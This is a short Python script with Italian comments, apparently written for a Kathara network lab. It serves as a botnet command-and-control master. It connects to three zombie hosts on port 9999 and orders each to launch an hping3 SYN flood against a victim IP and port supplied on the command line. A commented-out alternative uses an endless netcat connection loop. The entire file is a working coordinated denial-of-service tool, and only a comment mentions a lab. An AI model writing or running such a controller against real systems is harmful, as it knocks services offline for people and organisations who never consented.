#!/usr/bin/env python3
import socket
import sys
import threading

# Lista dei tuoi host zombie nel laboratorio Kathara
ZOMBIES = ["10.0.1.11", "10.0.1.12", "10.0.1.13"] 
ZOMBIE_PORT = 9999

def invia_comando(zombie_ip, target_ip, target_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((zombie_ip, ZOMBIE_PORT))
        
        # Comando inviato allo zombie. Ad esempio, gli ordiniamo di usare 
        # uno strumento di flood come hping3, ab (Apache Benchmark) o un comando di loop.
        # Esempio usando un flood TCP Syn leggero con hping3 (se installato nel container):
        comando = f"hping3 --flood -S -p {target_port} {target_ip} &\n"
        
        # In alternativa, se usi una socket raw o un semplice loop netcat/python sullo zombie:
        # comando = f"while true; do nc -w 1 {target_ip} {target_port} < /dev/null; done &\n"
        
        s.sendall(comando.encode())
        print(f"[+] Comando inviato con successo allo Zombie: {zombie_ip}")
        s.close()
    except Exception as e:
        print(f"[-] Errore con lo Zombie {zombie_ip}: {e}")

def main():
    if len(sys.argv) < 3:
        print("Uso: ./master_c2.py <IP_VITTIMA> <PORTA_VITTIMA>")
        sys.exit(1)
        
    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    
    print(f"[*] Inizializzazione attacco coordinato DoS contro {target_ip}:{target_port}...")
    
    threads = []
    for zombie in ZOMBIES:
        t = threading.Thread(target=invia_comando, args=(zombie, target_ip, target_port))
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    print("[*] Tutti i comandi di attacco sono stati impartiti alla botnet.")

if __name__ == "__main__":
    main()
